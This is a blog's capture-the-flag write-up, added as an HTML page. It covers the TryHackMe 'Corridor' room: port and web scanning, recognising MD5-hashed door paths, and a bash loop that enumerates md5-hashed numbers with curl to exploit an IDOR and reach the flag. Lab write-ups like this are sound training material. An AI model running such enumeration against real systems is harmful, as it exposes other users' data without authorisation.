@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>Corridor - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>Corridor</h1>
+<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-idor">IDOR</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/corridor"><strong>Corridor</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform. In this case I&#39;ll exploit an IDOR vulnerability with a simple Bash script that hashes with md5 every payload the script tries.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
+<ul>
+<li>TTL 64: Linux.</li>
+<li>TTL 128: Windows.</li>
+</ul>
+<pre><code>❯ ping -c 1 10.10.74.221
+PING 10.10.74.221 (10.10.74.221) 56(84) bytes of data.
+64 bytes from 10.10.74.221: icmp_seq=1 ttl=63 time=55.8 ms
+
+--- 10.10.74.221 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 55.785/55.785/55.785/0.000 ms
+</code></pre>
+<p>In this case, it seems to be a Linux machine. Let&#39;s perform some scans.</p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.74.221 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 19:23 CET
+Initiating SYN Stealth Scan at 19:23
+Scanning 10.10.74.221 [65535 ports]
+Discovered open port 80/tcp on 10.10.74.221
+Completed SYN Stealth Scan at 19:23, 16.22s elapsed (65535 total ports)
+Nmap scan report for 10.10.74.221
+Host is up, received user-set (0.066s latency).
+Scanned at 2025-11-08 19:23:27 CET for 16s
+Not shown: 62728 closed tcp ports (reset), 2806 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 62
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds
+           Raw packets sent: 80579 (3.545MB) | Rcvd: 65971 (2.639MB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p80 10.10.74.221 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 19:24 CET
+Nmap scan report for 10.10.74.221
+Host is up (0.10s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
+|_http-title: Corridor
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
+</code></pre>
+<p>The intrussion is going to be from port 80, since it&#39;s the only open port.</p>
+<pre><code>❯ whatweb http://10.10.74.221
+http://10.10.74.221 [200 OK] Bootstrap[4.5.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.10.2], IP[10.10.74.221], Python[3.10.2], Title[Corridor], Werkzeug[2.0.3]
+</code></pre>
+<p>The web server of this machine is <code>Werkzeug/2.0.3 Python/3.10.2</code>.</p>
+<blockquote>
+<p><strong>Werkzeug is a comprehensive Python library</strong> that provides tools for building WSGI (Web Server Gateway Interface) compliant web applications. It began as a collection of utilities for WSGI applications and has grown into an advanced toolkit that handles crucial web development tasks like request and response processing, URL routing, and HTTP utilities. While it was initially developed as a core component of the <a href="https://www.google.com/search?q=Flask&client=firefox-b-e&sca_esv=0b7c28f53f4526bc&channel=entpr&ei=Q4sPacGQK8XV7M8PvsK82AE&ved=2ahUKEwiWu4T5luOQAxVTUaQEHY37MSkQgK4QegQIARAC&uact=5&oq=what+is+Werkzeug&gs_lp=Egxnd3Mtd2l6LXNlcnAiEHdoYXQgaXMgV2Vya3pldWcyBBAAGB4yBBAAGB4yBBAAGB4yCBAAGIAEGKIEMggQABiABBiiBEjqFlDNA1jTFXABeAKQAQKYAdYJoAHIF6oBDTAuNC4zLjAuMS43LTG4AQPIAQD4AQGYAgOgAqUBwgIEEAAYR8ICChAAGLADGNYEGEfCAg0QABiABBiwAxhDGIoFmAMAiAYBkAYKkgcDMi4xoAfCMLIHAzAuMbgHkAHCBwUyLTEuMsgHFQ&sclient=gws-wiz-serp&mstk=AUtExfCYq4GM9aZTITu-ww2MjVKiaDnd0CZ6VSEGL8iuh1YBKeGlaah0yGp9Wbu_KPHRTJbSkp-4t9rrEdZVp_tUOfQm88t2lW54x5BjcA-IKsoXEimGxJbcFOsxNZc2u8CQQa0&csui=3">Flask</a> web framework, it can be used independently.</p>
+</blockquote>
+<p><img src="/assets/images/corridor/web.png" alt=""></p>
+<p>Let&#39;s fuzz some directories.</p>
+<pre><code>❯  gobuster dir -u 10.10.74.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.74.221
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 87662 / 87662 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>Nothing. Let&#39;s see the source code.</p>
+<p><img src="/assets/images/corridor/cords.png" alt=""></p>
+<p>Take a look at what&#39;s in the source code.  I searched the <a href="https://www.w3schools.com/tags/tag_map.asp"><strong>map</strong></a> tag in W3C Schools&#39; site and I noticed that those cords indicate clickable zones in the image. It makes much more sense when we look at the image and see doors, we&#39;re literally in a corridor. Let&#39;s go one by one and see that&#39;s inside.</p>
+<p><img src="/assets/images/corridor/door1.png" alt=""></p>
+<p>Every door has the same source code content. 
+<code>sha-384...</code> is the integrity value that checks if the style sheet has not been modified.</p>
+<p>The style sheet in question contains this:</p>
+<p><img src="/assets/images/corridor/css.png" alt=""></p>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<p>Let&#39;s focus on the name of the different door&#39;s directories. They look like hashes.</p>
+<pre><code>❯ haiti c4ca4238a0b923820dcc509a6f75849b
+MD5 [HC: 0] [JtR: raw-md5]
+</code></pre>
+<p>They may be MD5 hashes.</p>
+<pre><code>❯ echo -n &quot;1&quot; | md5sum
+c4ca4238a0b923820dcc509a6f75849b
+</code></pre>
+<p>So, they are md5 hashes and each door seems to be related to one number from 1 to X. We can easily think of an IDOR vulnerability in which we&#39;ll be accessing &quot;doors&quot; for example from 0 to 100 and see if we can access.</p>
+<hr>
+<h2>Exploitation</h2>
+<p>I&#39;ll do a simple bash script.</p>
+<pre><code class="language-bash">#!/bin/bash
+
+url=&quot;http://10.10.74.221&quot;
+
+for i in $(seq 0 100); do
+  hash=$(echo -n &quot;$i&quot; | md5sum | awk &#39;{print $1}&#39;)
+  payload=&quot;$url/$hash&quot;
+
+  echo &quot;[+] Testing payload $i&quot;
+
+  r=$(curl -s &quot;$payload&quot; | xargs | grep -v &quot;404&quot;)
+
+  if [ &quot;$r&quot; ]; then
+    echo -e &quot;[+] Shot at $payload&quot;
+    echo
+  else
+    echo -e &quot;[-] Nothing found.&quot;
+  fi
+done
+</code></pre>
+<pre><code>❯ ./idor.sh
+[+] Testing payload 0
+[+] Shot at http://10.10.74.221/cfcd208495d565ef66e7dff9f98764da
+
+[+] Testing payload 1
+[+] Shot at http://10.10.74.221/c4ca4238a0b923820dcc509a6f75849b
+
+[+] Testing payload 2
+[+] Shot at http://10.10.74.221/c81e728d9d4c2f636f067f89cc14862c
+
+[+] Testing payload 3
+[+] Shot at http://10.10.74.221/eccbc87e4b5ce2fe28308fd9f2a7baf3
+
+[+] Testing payload 4
+[+] Shot at http://10.10.74.221/a87ff679a2f3e71d9181a67b7542122c
+
+[+] Testing payload 5
+[+] Shot at http://10.10.74.221/e4da3b7fbbce2345d7772b0674a318d5
+
+[+] Testing payload 6
+[+] Shot at http://10.10.74.221/1679091c5a880faf6fb5e6087eb1b2dc
+
+[+] Testing payload 7
+[+] Shot at http://10.10.74.221/8f14e45fceea167a5a36dedd4bea2543
+
+[+] Testing payload 8
+[+] Shot at http://10.10.74.221/c9f0f895fb98ab9159f51fd0297e236d
+
+[+] Testing payload 9
+[+] Shot at http://10.10.74.221/45c48cce2e2d7fbdea1afc51c7c6ad26
+
+[+] Testing payload 10
+[+] Shot at http://10.10.74.221/d3d9446802a44259755d38e6d163e820
+
+[+] Testing payload 11
+[+] Shot at http://10.10.74.221/6512bd43d9caa6e02c990b0a82652dca
+
+[+] Testing payload 12
+[+] Shot at http://10.10.74.221/c20ad4d76fe97759aa27a0c99bff6710
+
+[+] Testing payload 13
+[+] Shot at http://10.10.74.221/c51ce410c124a10e0db5e4b97fc2af39
+
+[+] Testing payload 14
+[-] Nothing found.
+[+] Testing payload 15
+[-] Nothing found.
+...
+</code></pre>
+<p>There are 13 doors but we found 14 valid URLs.</p>
+<p><img src="/assets/images/corridor/flag.png" alt=""></p>
+<p>The number 0 hashed with md5 is the name of the directory that contains the flag of this CTF.</p>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
